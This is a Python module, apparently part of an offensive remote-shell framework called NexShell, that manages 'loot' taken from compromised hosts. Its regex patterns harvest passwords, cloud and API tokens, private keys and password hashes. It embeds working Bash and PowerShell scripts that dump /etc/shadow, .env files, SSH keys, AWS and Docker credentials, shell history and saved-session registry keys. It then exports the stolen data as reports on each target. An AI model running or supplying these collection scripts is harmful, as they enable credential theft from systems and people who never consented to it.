#!/usr/bin/env python3
"""
NexShell — Loot Manager
Auto-collect, categorize, and report everything gathered from sessions.
Supports credentials, keys, tokens, hashes, network intel, file loot.
"""

import os
import re
import json
import base64
import hashlib
import datetime
from pathlib import Path
from typing import Dict, List, Optional


# ══════════════════════════════════════════════════════════════════════════════
#  LOOT ITEM
# ══════════════════════════════════════════════════════════════════════════════

class LootItem:
    """A single piece of collected intelligence."""

    def __init__(self, category: str, source: str, data: str,
                 host: str = '', session_id: int = 0, confidence: str = 'high'):
        self.id          = hashlib.md5(data.encode()).hexdigest()[:8]
        self.category    = category
        self.source      = source
        self.data        = data
        self.host        = host
        self.session_id  = session_id
        self.confidence  = confidence
        self.ts          = datetime.datetime.utcnow().isoformat()

    def to_dict(self) -> dict:
        return {
            'id': self.id, 'category': self.category,
            'source': self.source, 'data': self.data,
            'host': self.host, 'session_id': self.session_id,
            'confidence': self.confidence, 'ts': self.ts,
        }

    def __repr__(self):
        preview = self.data[:60] + '...' if len(self.data) > 60 else self.data
        return f"[{self.category}] {self.source}: {preview}"


# ══════════════════════════════════════════════════════════════════════════════
#  LOOT PATTERNS  — regex matchers for auto-detection
# ══════════════════════════════════════════════════════════════════════════════

LOOT_PATTERNS: Dict[str, List[re.Pattern]] = {
    'credentials': [
        re.compile(r'(?i)(password|passwd|pwd|secret)\s*[=:]\s*([^\s\'"]{4,})', re.M),
        re.compile(r'(?i)DB_PASS(?:WORD)?\s*=\s*(.+)', re.M),
        re.compile(r'(?i)mysql://[^:]+:([^@]+)@'),
        re.compile(r'(?i)Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)'),
    ],
    'api_tokens': [
        re.compile(r'(?i)(api[_-]?key|api[_-]?token|access[_-]?token)\s*[=:]\s*([A-Za-z0-9_\-]{16,})', re.M),
        re.compile(r'ghp_[A-Za-z0-9]{36}'),                   # GitHub PAT
        re.compile(r'gho_[A-Za-z0-9]{36}'),                   # GitHub OAuth
        re.compile(r'AKIA[0-9A-Z]{16}'),                       # AWS Access Key ID
        re.compile(r'(?i)bearer\s+([A-Za-z0-9\-_\.]{20,})'),  # Bearer tokens
        re.compile(r'sk-[A-Za-z0-9]{32,}'),                   # OpenAI keys
        re.compile(r'xox[baprs]-[0-9A-Za-z\-]{10,}'),         # Slack tokens
    ],
    'private_keys': [
        re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----'),
        re.compile(r'-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----'),
    ],
    'hashes': [
        re.compile(r'^[a-zA-Z0-9_\-\.]+:[0-9]+:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}:::$', re.M),  # NTLM
        re.compile(r'^[a-zA-Z0-9_\-\.]+:\$[156y]\$[^\s:]+:[^\s]+$', re.M),                   # Linux hashes
        re.compile(r'(?i)NTLM[_\s]hash[:\s]+([A-Fa-f0-9]{32})', re.M),
    ],
    'network': [
        re.compile(r'(?:^|\s)(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{2,5}))?\s', re.M),
        re.compile(r'ssh\s+[a-z0-9_\-\.]+@(\d{1,3}(?:\.\d{1,3}){3})', re.M),
    ],
    'jwt': [
        re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),
    ],
    'connection_strings': [
        re.compile(r'(?i)(mongodb|postgresql|mysql|redis|amqp|mssql)://[^\s\'"]+', re.M),
        re.compile(r'(?i)Server=.+;Database=.+;(User|uid)=.+;(Password|pwd)=([^;]+)', re.M),
    ],
}


# ══════════════════════════════════════════════════════════════════════════════
#  LOOT MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class LootManager:
    """Central loot collection and reporting engine."""

    LOOT_DIR = os.path.expanduser('~/.nexshell/loot')

    def __init__(self, session_id: int = 0, host: str = ''):
        self.session_id = session_id
        self.host       = host
        self._items: List[LootItem] = []
        os.makedirs(self.LOOT_DIR, exist_ok=True)

    # ── Auto-scan output for loot ─────────────────────────────────────────────
    def scan_output(self, text: str, source: str = 'shell_output') -> List[LootItem]:
        """Scan any string output for interesting data."""
        found = []
        for category, patterns in LOOT_PATTERNS.items():
            for pat in patterns:
                for m in pat.finditer(text):
                    match_str = m.group(0).strip()
                    if len(match_str) < 8:
                        continue
                    item = LootItem(
                        category=category,
                        source=source,
                        data=match_str,
                        host=self.host,
                        session_id=self.session_id,
                    )
                    if item.id not in {i.id for i in self._items}:
                        self._items.append(item)
                        found.append(item)
        return found

    # ── Manual add ────────────────────────────────────────────────────────────
    def add(self, category: str, source: str, data: str,
            confidence: str = 'high') -> LootItem:
        item = LootItem(category, source, data, self.host,
                        self.session_id, confidence)
        if item.id not in {i.id for i in self._items}:
            self._items.append(item)
        return item

    # ── Auto-collect scripts ──────────────────────────────────────────────────
    @staticmethod
    def linux_auto_collect_script() -> str:
        """Bash one-liner to collect loot — run in-memory."""
        return r"""
echo "=== [NexShell Loot Auto-Collect] ==="
echo "--- /etc/passwd ---"
cat /etc/passwd 2>/dev/null | grep -v '^#'
echo "--- /etc/shadow (if readable) ---"
cat /etc/shadow 2>/dev/null | head -20
echo "--- Environment Secrets ---"
env 2>/dev/null | grep -iE 'pass|key|secret|token|api|aws|db_'
echo "--- .env files ---"
find / -name '.env' -readable 2>/dev/null | xargs cat 2>/dev/null | head -100
echo "--- Database configs ---"
find /var/www /opt /home -name '*.php' -o -name 'database.yml' -o -name 'settings.py' 2>/dev/null \
  | xargs grep -lE 'password|passwd|secret' 2>/dev/null | head -10 \
  | xargs grep -hE 'password|passwd|DB_PASS|SECRET' 2>/dev/null | head -50
echo "--- SSH Private Keys ---"
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -readable 2>/dev/null \
  | xargs cat 2>/dev/null | head -100
echo "--- Shell History ---"
cat ~/.bash_history ~/.zsh_history ~/.history 2>/dev/null | grep -iE 'pass|ssh|curl|wget|token' | head -30
echo "--- AWS Credentials ---"
cat ~/.aws/credentials 2>/dev/null
echo "--- Git Configs ---"
find / -name '.git' -type d 2>/dev/null | head -5 | while read d; do cat "$d/config" 2>/dev/null; done
echo "--- Docker Secrets ---"
cat ~/.docker/config.json 2>/dev/null
echo "=== [Done] ==="
"""

    @staticmethod
    def windows_auto_collect_script() -> str:
        """PowerShell script for Windows loot collection."""
        return r"""
Write-Host "=== [NexShell Loot Auto-Collect - Windows] ===" -ForegroundColor Cyan

Write-Host "`n--- Environment Secrets ---" -ForegroundColor Yellow
[System.Environment]::GetEnvironmentVariables() | Where-Object {
    $_.Key -match 'pass|key|secret|token|api|aws|db'
} | Format-Table

Write-Host "`n--- AWS Credentials ---" -ForegroundColor Yellow
$paths = @("$env:USERPROFILE\.aws\credentials","$env:USERPROFILE\.aws\config")
foreach($p in $paths){ if(Test-Path $p){ Get-Content $p } }

Write-Host "`n--- SSH Keys ---" -ForegroundColor Yellow
Get-ChildItem "$env:USERPROFILE\.ssh" -ErrorAction SilentlyContinue | Select FullName
Get-ChildItem "$env:USERPROFILE\.ssh\id_rsa","$env:USERPROFILE\.ssh\id_ed25519" -ErrorAction SilentlyContinue | Get-Content

Write-Host "`n--- Git Configs ---" -ForegroundColor Yellow
Get-ChildItem -Recurse -Filter '.gitconfig' "$env:USERPROFILE" -ErrorAction SilentlyContinue | Get-Content

Write-Host "`n--- Browser Saved Passwords (paths) ---" -ForegroundColor Yellow
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | Where-Object {Test-Path $_} | ForEach-Object { Write-Host "[Found] $_" -ForegroundColor Green }

Write-Host "`n--- Interesting Registry ---" -ForegroundColor Yellow
$regs = @(
    'HKCU:\Software\SimonTatham\PuTTY\Sessions',
    'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions'
)
foreach($r in $regs){ if(Test-Path $r){ Get-ItemProperty $r 2>$null } }

Write-Host "`n--- Config Files with Passwords ---" -ForegroundColor Yellow
Get-ChildItem C:\inetpub,C:\xampp,C:\wamp,C:\www -Recurse -Include *.xml,*.ini,*.conf,*.config,*.json -ErrorAction SilentlyContinue |
  Where-Object {Select-String -Path $_ -Pattern 'password|passwd|secret|credentials' -Quiet} |
  Select FullName | Select-Object -First 20

Write-Host "`n=== [Done] ===" -ForegroundColor Cyan
"""

    # ── Reporting ─────────────────────────────────────────────────────────────
    def summary(self) -> str:
        if not self._items:
            return "No loot collected yet."
        by_cat = {}
        for item in self._items:
            by_cat.setdefault(item.category, []).append(item)
        lines = [f"\n  📦 Loot Summary — {self.host or 'unknown target'}\n"]
        icons = {
            'credentials': '🔑', 'api_tokens': '🎫', 'private_keys': '🗝️',
            'hashes': '💾', 'network': '🌐', 'jwt': '🎟️',
            'connection_strings': '🔗',
        }
        for cat, items in by_cat.items():
            icon = icons.get(cat, '📄')
            lines.append(f"  {icon}  {cat:<22} {len(items)} item(s)")
        lines.append(f"\n  Total: {len(self._items)} items\n")
        return '\n'.join(lines)

    def items_by_category(self, category: str) -> List[LootItem]:
        return [i for i in self._items if i.category == category]

    def export_json(self, path: str = None) -> str:
        data = {
            'meta': {
                'host': self.host, 'session_id': self.session_id,
                'exported': datetime.datetime.utcnow().isoformat(),
                'total': len(self._items),
            },
            'loot': [i.to_dict() for i in self._items],
        }
        if not path:
            ts   = datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')
            name = f"nexshell_loot_{self.host.replace('.','_')}_{ts}.json"
            path = os.path.join(self.LOOT_DIR, name)
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
        return path

    def export_markdown(self, path: str = None) -> str:
        ts   = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')
        lines = [
            f"# NexShell Loot Report",
            f"**Target:** `{self.host}`  **Session:** #{self.session_id}  **Date:** {ts}\n",
            f"---\n",
        ]
        by_cat = {}
        for item in self._items:
            by_cat.setdefault(item.category, []).append(item)
        for cat, items in by_cat.items():
            lines.append(f"## {cat.replace('_',' ').title()} ({len(items)})\n")
            for item in items:
                lines.append(f"- **Source:** `{item.source}`")
                lines.append(f"  ```\n  {item.data[:300]}\n  ```\n")
        if not path:
            name = f"nexshell_loot_{self.host.replace('.','_')}.md"
            path = os.path.join(self.LOOT_DIR, name)
        with open(path, 'w') as f:
            f.write('\n'.join(lines))
        return path

    def export_html(self, path: str = None) -> str:
        ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')
        items_html = ''
        for item in self._items:
            clr = {'credentials':'#ef4444','api_tokens':'#f97316','private_keys':'#eab308',
                   'hashes':'#a855f7','network':'#06b6d4','jwt':'#ec4899',
                   'connection_strings':'#84cc16'}.get(item.category, '#94a3b8')
            items_html += (
                f'<div class="item">'
                f'<span class="cat" style="color:{clr}">{item.category}</span> '
                f'<span class="src">{item.source}</span>'
                f'<pre>{item.data[:500]}</pre></div>\n'
            )
        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>NexShell Loot — {self.host}</title>
<style>
body{{background:#0d1117;color:#e2e8f0;font-family:monospace;padding:2rem}}
h1{{color:#a855f7}} .item{{border:1px solid #30363d;border-radius:6px;padding:1rem;margin:.5rem 0}}
.cat{{font-weight:700;text-transform:uppercase;font-size:.8rem}}
.src{{color:#94a3b8;margin-left:1rem}}
pre{{background:#161b22;border-radius:4px;padding:.5rem;overflow-x:auto;color:#84cc16;font-size:.85rem}}
</style></head><body>
<h1>🎯 NexShell Loot Report</h1>
<p><strong>Target:</strong> {self.host} &nbsp;|&nbsp; <strong>Session:</strong> #{self.session_id}
&nbsp;|&nbsp; <strong>Date:</strong> {ts} &nbsp;|&nbsp;
<strong>Total:</strong> {len(self._items)} items</p>
<hr>
{items_html}
</body></html>"""
        if not path:
            name = f"nexshell_loot_{self.host.replace('.','_')}.html"
            path = os.path.join(self.LOOT_DIR, name)
        with open(path, 'w') as f:
            f.write(html)
        return path

    # ── Singleton per session ─────────────────────────────────────────────────
    _registry: Dict[int, 'LootManager'] = {}

    @classmethod
    def for_session(cls, session_id: int, host: str = '') -> 'LootManager':
        if session_id not in cls._registry:
            cls._registry[session_id] = cls(session_id, host)
        return cls._registry[session_id]

    @classmethod
    def all_loot(cls) -> List[LootItem]:
        items = []
        for mgr in cls._registry.values():
            items.extend(mgr._items)
        return items
